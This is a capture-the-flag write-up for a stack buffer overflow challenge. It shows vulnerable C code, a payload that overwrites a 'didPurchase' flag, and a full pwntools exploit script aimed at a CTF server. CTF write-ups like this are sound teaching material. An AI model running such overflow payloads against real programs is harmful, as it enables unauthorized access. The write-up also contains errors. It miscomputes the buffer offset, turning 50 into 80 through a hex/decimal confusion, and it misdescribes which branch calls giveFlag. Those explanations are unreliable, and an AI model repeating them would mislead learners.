**This is a writeup for the stack0 part1 challenge**

Below is the main function that our prorgam will run
```
void func(void) {
	bool didPurchase = false;
	char input[50];
	
	printf("Debug info: Address of input buffer = %p\n", input);
	
	printf("Enter the name you used to purchase this program:\n");
	read(STDIN_FILENO, input, 1024);
	
	if(didPurchase) {
		printf("Thank you for purchasing Hackersoft Powersploit!\n");
		giveFlag();
	}
	else {
		printf("This program has not been purchased.\n");
	}
}

int main(void) {
	func();
	return 0;
}
```

Our main func initializes a boolean variable of "didPurchase" to false. We initialize a character array with 50 bytes of allocated space. 

We see that the program is taking user input through the line
```
read(0, input, 0x400);
```
From this line we are reading from standard input (file descriptor 0), storing the data in the input buffer, and taking in an input of 1024 bytes.

Now we get to the if statement that checks if didPurchase == false. What we want our exploit to do is set didPurchase to true so that we can jump to the else statement which calls the function "giveFlag()"

**Exploit Methdo**
Lets take a look at our stack layout to see where our input buffer and our didPurchase value are located.

This is important because we want to overflow the input buffer so that we can overwrite the didPurchase variable and set it equal to true.

```
Stack[-0x8]:4 local_8
Stack[-0xd]:1 didPurchase
Stack[-0x3f]... input
```

The first thing we should do is take the offset from input to did purchase. We need to convert the hex value to decimal
```
0x3f - 0xd => 63 - 13 => 50 => 5 x 16 + 0 = 80
```
The offset between input and didPurchase is 80 bytes, so the first part of our payload is to fill these 80 bytes
```
payload = b"A" * 80
```

Now that we have overflowed the input buffer, we are now in the didPurchase address space which means all we have to do is set the value of it from false to true. We can do this by packing in a byte of value 1
```
payload += p32(1)
```

Now our entire payload should look like
```
payload = b"A" * 80 + p32(1)
```

This will overflow the contents of input buf and will overwrite the didPurchase variable to true.

**Final Exploit**
```
from pwn import *

HOST = "ctf.hackucf.org"
PORT = 32101
BINARY = './stack0'

elf = ELF(BINARY)
context.binary = elf

BUFFER_SIZE = 80

payload = b"A" * BUFFER_SIZE + p32(1)

def exploit_remote():
    r = remote(HOST, PORT)
    r.sendline(payload)
    r.interactive()
if __name__ == "__main__":
    exploit_remote()
```
